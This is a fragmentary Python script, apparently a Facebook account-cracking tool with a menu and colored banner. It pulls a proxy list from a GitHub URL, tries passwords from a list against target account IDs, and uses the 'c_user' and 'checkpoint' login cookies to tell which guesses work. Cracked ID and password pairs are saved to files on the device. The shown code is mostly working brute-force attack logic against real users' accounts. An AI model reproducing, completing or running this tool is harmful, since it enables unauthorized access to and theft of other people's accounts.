...
try:
	prox= requests.get('https://raw.githubusercontent.com/TAHMED0/ZR/main/Veer.txt').text
...
\33[1;37m----------------------------------------------
→   Owner      :  THE FUCKER
→   Facebook   :  MOOD NHI BTANE KA
→   Github     :  private 
→   Tool Type  :  \x1b[1;91mFREE
\x1b[1;97m→   Version    :  testing h abhi
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():			
			...
			linex()
			AHMED=input(' Choose an option: ')
			if AHMED in ['1','01']:
				os.system('clear')
				print(logo)
				
				linex()
				print(' Example : /sdcard/AHMED.txt')
				linex()
				...
				os.system('xdg-open https://www.facebook.com/AHMEDo.MaLanG.Official?mibextid=ZbWKwL');menu()
			elif AHMED in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mAHMED\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[AHMEDE-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/AHMEDE-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[AHMEDE-LOL] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AHMEDE-LOL.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[AHMEDE-LOL] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AHMEDE-LOL.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[AHMEDE-OK]'+cid+' | '+ps+'\033[1;32m')
				open('AHMEDE-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[AHMEDE-LOL] '+cid+' | '+ps+'\33[0;97m')
				open('AHMEDE-LO.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
...
def cinc():
    os.system('clear')
    print(logo)
    print(' example : 2120154****,1347583***,Etc')
    linex()
